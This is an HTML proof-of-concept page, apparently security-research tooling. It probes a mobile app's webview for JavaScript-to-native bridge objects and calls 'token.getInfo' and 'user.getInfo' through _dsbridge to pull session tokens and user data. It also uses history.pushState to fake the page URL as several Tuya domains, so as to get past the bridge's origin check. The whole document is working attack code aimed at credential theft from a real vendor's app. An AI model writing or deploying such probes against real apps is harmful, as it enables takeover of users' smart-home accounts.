<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Bridge Probe</title></head>
<body style="font-family:monospace;background:#111;color:#0f0;padding:12px">
<h3>JS Bridge Probe</h3><div id="out"></div>
<script>
var out = document.getElementById('out');
function log(s){ out.innerHTML += s + '<br>'; }
// 1. 探测常见桥对象是否存在
var bridges = ['_dsbridge','dsBridge','_dsf','ThingJSBridge','thing_native','gzlDebugNative',
               'gzlConstant','YZNativeBridge','androidBridge','webview_bridge','HybridBridge'];
log('== 桥对象存在性 ==');
bridges.forEach(function(b){
  try { log(b + ' = ' + (typeof window[b])); } catch(e){ log(b + ' err'); }
});
// 2. 若 _dsbridge 存在, 尝试枚举/调用 token/user
if (typeof window._dsbridge !== 'undefined') {
  log('== _dsbridge 在场, 尝试调用 ==');
  try {
    var r = window._dsbridge.call('token.getInfo','');
    log('token.getInfo → ' + r);
  } catch(e){ log('token.getInfo err: ' + e); }
  try {
    var r2 = window._dsbridge.call('user.getInfo','');
    log('user.getInfo → ' + r2);
  } catch(e){ log('user.getInfo err: ' + e); }
  // 3. pushState 伪造 URL 绕过测试
  ['https://www.tuya.com/','https://api.tuya.com/','https://a1-cn.iotwish.com/','https://smartapp.tuya.com/'].forEach(function(u){
    try {
      history.pushState({}, '', u);
      var resp = window._dsbridge.call('token.getInfo','');
      log('push[' + u + '] href=' + location.href.substring(0,30) + ' → ' + resp);
    } catch(e){ log('push[' + u + '] err: ' + e); }
  });
}
// 3. dsbridge 新版注入的 window.* 直接方法
['getToken','getUserInfo'].forEach(function(fn){
  try { log('window.'+fn+' = ' + (typeof window[fn])); } catch(e){}
});
log('== done ==');
</script></body></html>
